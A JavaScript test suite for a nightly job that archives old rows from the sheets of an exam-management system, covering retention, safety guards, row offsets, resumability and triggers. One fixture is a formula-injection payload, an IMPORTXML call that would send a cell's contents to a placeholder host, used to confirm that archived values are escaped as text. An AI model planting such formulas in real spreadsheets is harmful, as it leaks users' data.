// Run: node tests/archive.test.cjs
//
// The nightly archive (DESIGN §3.5, review C B5) is the one job that DELETES
// rows from the sheets the whole system depends on, so every guard it has is
// pinned here: it must move only rows past their retention, never while an exam
// could be in progress, keep the live row numbers valid while deleting, create
// its archive sheets with the source header, and be resumable when it runs out
// of time. A bug here is not a slow dashboard — it is lost exam history.
'use strict';
const assert = require('node:assert/strict');
const { createEnv } = require('./helpers/server_env.cjs');

let checks = 0;
const check = (label, fn) => { fn(); checks++; console.log('ok  ' + label); };
// Objects and arrays built inside the vm carry the vm's prototypes, and
// deepStrictEqual compares those; plain() brings a value back to this realm.
const plain = v => JSON.parse(JSON.stringify(v));
const ids = (env, name) => plain(env.rows(name)).slice(1).map(r => String(r[1]));

const DAY = 86400000;
const NOW = Date.parse('2026-09-22T01:00:00Z');
const iso = ms => new Date(ms).toISOString();
function sheetDate(ms) {
  const d = new Date(ms);
  const p = n => String(n).padStart(2, '0');
  return `${p(d.getDate())}/${p(d.getMonth() + 1)}/${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`;
}

const PEND_HEADER = ['קוד סשן', 'ת.ז.', 'שם', 'טלפון', 'זמן הרשמה', 'סטטוס', 'שפה', 'אוכלוסיה', 'דרגה', 'שמע',
  'הארכת זמן', 'התחלת מבחן', 'טוקן נבחן', 'ספירת DQ', 'מסך נוסף', 'ספירת אזהרות', 'אזהרה אחרונה', 'אתר', 'סיים במכשיר'];
const RES_HEADER = ['תאריך', 'ת.ז.', 'שם', 'טלפון', 'דרגה', 'ציון', 'אחוז', 'עבר/נכשל', 'זמן', 'בוחן', 'אתר', 'כיתה',
  'שפה', 'קוד סשן', 'ניסיון', 'פירוט שגויות', 'נשלח?', 'פסול?', 'קישור וואטסאפ', 'אוכלוסיה', 'תוקן?', 'שמע', 'מאומת',
  'חשוד', 'dqEventId', 'תוקן ע"י', 'סיבת תיקון', 'תאריך תיקון', 'מסלול שפות', 'מכשיר'];
const EXAMS_HEADER = ['קוד סשן', 'ת.ז.', 'שאלות JSON', 'זמן רישום', 'שפה', 'שגויות לא מאומתות'];
const SESS_HEADER = ['קוד', 'בוחן ת.ז.', 'שם בוחן', 'אתר', 'כיתה', 'דרגה', 'שפה', 'מצב שמע', 'זמן יצירה', 'תקף עד',
  'פעיל', 'כמויות JSON', 'מאושרים JSON', 'בוחן אחראי', 'אוכלוסיה'];

function pend(id, ageDays, status) {
  const row = new Array(19).fill('');
  row[0] = 'S' + id; row[1] = String(id); row[2] = 'נבחן'; row[4] = iso(NOW - ageDays * DAY); row[5] = status || 'completed';
  row[18] = '';
  return row;
}
function res(id, ageDays) {
  const row = new Array(30).fill('');
  row[0] = sheetDate(NOW - ageDays * DAY); row[1] = String(id); row[4] = 'B'; row[7] = 'עבר'; row[13] = 'S' + id;
  return row;
}
function exam(id, ageDays) { return ['S' + id, String(id), '{"q":1}', iso(NOW - ageDays * DAY), 'he', 0]; }

// A closed session, long expired: the default state at 01:00.
const CLOSED_SESSION = ['OLD1', '111111111', 'בוחן', 'בסיס', 'כיתה', 'B', 'he', 'off',
  iso(NOW - 10 * DAY), iso(NOW - 10 * DAY + 8 * 3600000), false, '[]', '', '', ''];

function baseSheets(overrides) {
  const pending = [PEND_HEADER];
  for (let i = 0; i < 5; i++) pending.push(pend(1000 + i, 30 - i));      // 30..26 days old → archived
  for (let i = 0; i < 3; i++) pending.push(pend(2000 + i, 5 - i));       // 5..3 days old → stay
  const results = [RES_HEADER];
  for (let i = 0; i < 4; i++) results.push(res(3000 + i, 60 - i));       // 60..57 days → archived
  for (let i = 0; i < 3; i++) results.push(res(4000 + i, 10 - i));       // 10..8 days → stay
  const exams = [EXAMS_HEADER];
  for (let i = 0; i < 4; i++) exams.push(exam(5000 + i, 9 - i));         // 9..6 days → archived
  exams.push(exam(6000, 1));                                             // yesterday → stays
  return Object.assign({ 'ממתינים': pending, 'תוצאות': results, 'מבחנים': exams,
    'סשנים': [SESS_HEADER, CLOSED_SESSION] }, overrides || {});
}

// ---- 1. retention per sheet -------------------------------------------------
{
  const env = createEnv({ sheets: baseSheets(), now: NOW });
  const out = env.ctx.archiveSheets();
  check('each sheet keeps exactly its retention window', () => {
    assert.deepEqual(plain(out.moved), { 'ממתינים': 5, 'מבחנים': 4, 'תוצאות': 4 });
    assert.equal(env.rows('ממתינים').length, 1 + 3);
    assert.equal(env.rows('תוצאות').length, 1 + 3);
    assert.equal(env.rows('מבחנים').length, 1 + 1);
  });
  check('the moved rows are the OLD ones, and they are intact in the archive', () => {
    assert.deepEqual(ids(env, 'ממתינים'), ['2000', '2001', '2002']);
    assert.deepEqual(ids(env, 'ממתינים_ארכיון'), ['1000', '1001', '1002', '1003', '1004']);
    assert.deepEqual(ids(env, 'תוצאות_ארכיון'), ['3000', '3001', '3002', '3003']);
    assert.deepEqual(ids(env, 'מבחנים_ארכיון'), ['5000', '5001', '5002', '5003']);
    assert.equal(env.rows('מבחנים_ארכיון')[1][2], '{"q":1}', 'the question map is copied, not summarised');
  });
  check('archive sheets are born with the source header', () => {
    assert.deepEqual(plain(env.rows('ממתינים_ארכיון')[0]), PEND_HEADER);
    assert.deepEqual(plain(env.rows('תוצאות_ארכיון')[0]), RES_HEADER);
    assert.deepEqual(plain(env.rows('מבחנים_ארכיון')[0]), EXAMS_HEADER);
  });
  check('a second run has nothing left to move', () => {
    assert.deepEqual(plain(env.ctx.archiveSheets().moved), { 'ממתינים': 0, 'מבחנים': 0, 'תוצאות': 0 });
  });
  check('archiveOldPendingRows still works (one release of overlap)', () => {
    assert.equal(typeof env.ctx.archiveOldPendingRows, 'function');
    assert.deepEqual(plain(env.ctx.archiveOldPendingRows().moved), { 'ממתינים': 0, 'מבחנים': 0, 'תוצאות': 0 });
  });
}

// ---- 2. the two guards ------------------------------------------------------
{
  const sheets = baseSheets();
  sheets['ממתינים'].push(pend(7000, 0.05, 'in_exam'));   // registered ~1h ago, not terminal
  const env = createEnv({ sheets, now: NOW });
  const out = env.ctx.archiveSheets();
  check('a fresh non-terminal registration stops the whole run', () => {
    assert.match(String(out.skipped), /non-terminal registration/);
    assert.equal(env.rows('ממתינים').length, 1 + 9);
    assert.equal(env.sheets.has('תוצאות_ארכיון'), false, 'and nothing else is touched either');
  });
}
{
  const sheets = baseSheets();
  sheets['סשנים'].push(['LIVE1', '111111111', 'בוחן', 'בסיס', 'כיתה', 'B', 'he', 'off',
    iso(NOW - 3600000), iso(NOW + 4 * 3600000), true, '[]', '', '', '']);
  const env = createEnv({ sheets, now: NOW });
  const out = env.ctx.archiveSheets();
  check('an open session stops the whole run', () => {
    assert.match(String(out.skipped), /LIVE1 is still open/);
    assert.equal(env.rows('תוצאות').length, 1 + 7);
  });
}
{
  const sheets = baseSheets();
  // Active flag TRUE but expired yesterday: not a reason to skip.
  sheets['סשנים'].push(['STALE1', '111111111', 'בוחן', 'בסיס', 'כיתה', 'B', 'he', 'off',
    iso(NOW - 2 * DAY), iso(NOW - DAY), true, '[]', '', '', '']);
  const env = createEnv({ sheets, now: NOW });
  check('a session left "active" but long expired does not block the archive', () => {
    assert.deepEqual(plain(env.ctx.archiveSheets().moved), { 'ממתינים': 5, 'מבחנים': 4, 'תוצאות': 4 });
  });
}

// ---- 3. deleting keeps the live rows valid ---------------------------------
{
  // Interleave old and new rows so the deleted row numbers are NOT contiguous:
  // this is the case that breaks when the offsets are wrong.
  const pending = [PEND_HEADER];
  const expectedSurvivors = [];
  for (let i = 0; i < 40; i++) {
    const old = i % 2 === 0;
    pending.push(pend(8000 + i, old ? 40 : 1));
    if (!old) expectedSurvivors.push(String(8000 + i));
  }
  const env = createEnv({ sheets: baseSheets({ 'ממתינים': pending }), now: NOW });
  const out = env.ctx.archiveSheets();
  check('interleaved old/new rows: exactly the old ones leave, in order', () => {
    assert.equal(out.moved['ממתינים'], 20);
    assert.deepEqual(ids(env, 'ממתינים'), expectedSurvivors);
    assert.deepEqual(ids(env, 'ממתינים_ארכיון'), expectedSurvivors.map(id => String(Number(id) - 1)));
  });
  check('the surviving rows are still whole rows, not shifted cells', () => {
    for (const row of plain(env.rows('ממתינים')).slice(1)) {
      assert.equal(row[0], 'S' + row[1]);
      assert.equal(row[5], 'completed');
      assert.equal(row.length, 19);
    }
  });
}

// ---- 4. the time budget is resumable ---------------------------------------
{
  const pending = [PEND_HEADER];
  for (let i = 0; i < 700; i++) pending.push(pend(9000 + i, 40));   // 700 old rows = 3 chunks
  const env = createEnv({ sheets: baseSheets({ 'ממתינים': pending }), now: NOW });
  // Every flush (one per chunk) costs three minutes of the 4.5-minute budget.
  const realFlush = env.ctx.SpreadsheetApp.flush;
  env.ctx.SpreadsheetApp.flush = () => { env.clock.t += 3 * 60000; realFlush(); };
  const first = env.ctx.archiveSheets();
  check('a run that hits the budget stops and says so', () => {
    assert.equal(first.stopped, 'ממתינים');
    assert.equal(first.moved['ממתינים'], 600, 'two chunks moved');
    assert.equal(env.rows('ממתינים').length, 1 + 100, 'the rest is still live');
    assert.equal(env.rows('ממתינים_ארכיון').length, 1 + 600);
  });
  check('the interrupted run left the OLDEST rows in the archive, newest live', () => {
    assert.equal(ids(env, 'ממתינים')[0], '9600', 'the live sheet keeps the newest candidates');
  });
  check('the next run finishes the job', () => {
    env.clock.t += DAY;
    const second = env.ctx.archiveSheets();
    assert.equal(second.moved['ממתינים'], 100);
    assert.equal(env.rows('ממתינים').length, 1, 'only the header is left');
    assert.equal(env.rows('ממתינים_ארכיון').length, 1 + 700);
    assert.deepEqual(ids(env, 'ממתינים_ארכיון').slice(0, 2), ['9000', '9001'], 'and the archive is still in order');
  });
}

// ---- 5. the nightly triggers ------------------------------------------------
{
  const env = createEnv({ sheets: baseSheets(), now: NOW });
  // Pretend the account still carries every retired job's trigger.
  for (const fn of ['archiveOldPendingRows', 'warmupQuestionCaches', 'ensureQuestionCachesWarm',
    'rebuildMissingQuestionCaches', 'rebuildAtRiskCache', 'archiveSheets']) {
    env.ctx.ScriptApp.newTrigger(fn).timeBased().everyHours(1).create();
  }
  env.ctx.ScriptApp.newTrigger('doSomethingElse').timeBased().everyHours(6).create();
  const msg = env.ctx.installNightlyJobs();
  check('installNightlyJobs leaves exactly the two nightly triggers', () => {
    const ours = env.triggers.filter(t => t.getHandlerFunction() !== 'doSomethingElse');
    assert.deepEqual(ours.map(t => t.getHandlerFunction()).sort(), ['archiveSheets', 'rebuildAtRiskCache']);
    assert.deepEqual(ours.map(t => t.hour).sort(), [1, 3]);
    assert.deepEqual(ours.map(t => t.tz), ['Asia/Jerusalem', 'Asia/Jerusalem']);
    assert.match(msg, /removed 6 old trigger\(s\)/);
  });
  check('a trigger of another job is left alone', () => {
    assert.equal(env.triggers.filter(t => t.getHandlerFunction() === 'doSomethingElse').length, 1);
  });
  check('running it twice does not double the triggers', () => {
    env.ctx.installNightlyJobs();
    assert.equal(env.triggers.filter(t => t.getHandlerFunction() === 'archiveSheets').length, 1);
    assert.equal(env.triggers.filter(t => t.getHandlerFunction() === 'rebuildAtRiskCache').length, 1);
  });
}

// ---- 6. the archive run also sweeps the diagnostics -------------------------
{
  const env = createEnv({ sheets: baseSheets(), now: NOW,
    properties: { 'qv2_diag_dead1': JSON.stringify({ a: 'examinerDashboard', m: 'GET', ph: 'sheet:results-dash', t: NOW - 3600000 }) } });
  const out = env.ctx.archiveSheets();
  check('a killed execution left behind is recorded in אבחון by the nightly run', () => {
    assert.equal(out.diagnostics.swept, 1);
    const rows = env.rows('אבחון');
    assert.equal(rows[rows.length - 1][1], 'KILLED');
    assert.equal(rows[rows.length - 1][3], 'examinerDashboard');
    assert.equal(env.properties.has('qv2_diag_dead1'), false);
  });
}

// ---- 7. r35.2 (review_r35_1_server M1): nightly copies stay text ----------
// cellSafe's apostrophe protects ONE write: Sheets returns the text without it,
// and a nightly setValues of what was read back re-armed '=…' as a formula.
// (The mock sheet keeps what was written, so a value "read back" here is the
// raw text a real sheet would return.)
const FORMULA = '=IMPORTXML("https://x.invalid/?"&A1,"//a")';
{
  const sheets = baseSheets();
  const hostile = pend(1100, 30);
  hostile[2] = FORMULA; hostile[3] = '+972500000001'; hostile[7] = '@pop'; hostile[8] = '-B';
  sheets['ממתינים'].splice(1, 0, hostile);
  const oldResult = res(3100, 60);
  oldResult[2] = FORMULA;
  sheets['תוצאות'].splice(1, 0, oldResult);
  const env = createEnv({ sheets, now: NOW });
  env.ctx.archiveSheets();
  const archived = plain(env.rows('ממתינים_ארכיון')).find(r => String(r[1]) === '1100');
  check('the archive writes read-back text as text: names, phones, anything starting = + - @', () => {
    assert.deepEqual([archived[2], archived[3], archived[7], archived[8]], ['\'' + FORMULA, '\'+972500000001', '\'@pop', '\'-B']);
    const archivedResult = plain(env.rows('תוצאות_ארכיון')).find(r => String(r[1]) === '3100');
    assert.equal(archivedResult[2], '\'' + FORMULA);
  });
  check('and leaves everything else exactly as it was', () => {
    assert.equal(archived[5], 'completed');
    assert.equal(archived[4], hostile[4], 'the ISO timestamp');
    const plainRow = plain(env.rows('ממתינים_ארכיון')).find(r => String(r[1]) === '1000');
    assert.deepEqual(plainRow, pend(1000, 30), 'an ordinary row is copied unchanged');
    assert.deepEqual(plain(env.rows('ממתינים_ארכיון')[0]), PEND_HEADER, 'the header too');
  });
}
{
  const env = createEnv({ sheets: baseSheets({ 'חיזוי סיכון': [['header']] }), now: NOW });
  env.ctx.computeAtRiskAll = () => ({ computedAtMs: NOW, summary: {}, modelBaseRate: 0.5, students: [{
    name: FORMULA, license: '@B', classCode: '-CLS', teacherId: '222222222', teacherName: '+t', className: '=c', site: '@s',
    lastPct: 40, sessions: 3, trend: -5, attempt: 1, everTested: false, prob: 0.2, tier: 'high', confidence: 'low',
    matchedByPhone: false, phone: '+972500000002' }] });
  env.ctx.rebuildAtRiskCache();
  const row = plain(env.rows('חיזוי סיכון'))[1];
  check('the at-risk sheet writes the names it read back from practice as text', () => {
    assert.deepEqual([row[1], row[2], row[3], row[5], row[6], row[7], row[17]],
      ['\'' + FORMULA, '\'@B', '\'-CLS', '\'+t', '\'=c', '\'@s', '\'+972500000002']);
  });
  check('numbers and flags in the at-risk row are untouched', () => {
    assert.deepEqual([row[8], row[9], row[10], row[11], row[12], row[13], row[16]], [40, 3, -5, 1, false, 0.2, false]);
  });
}

console.log('\n' + checks + ' archive checks passed');
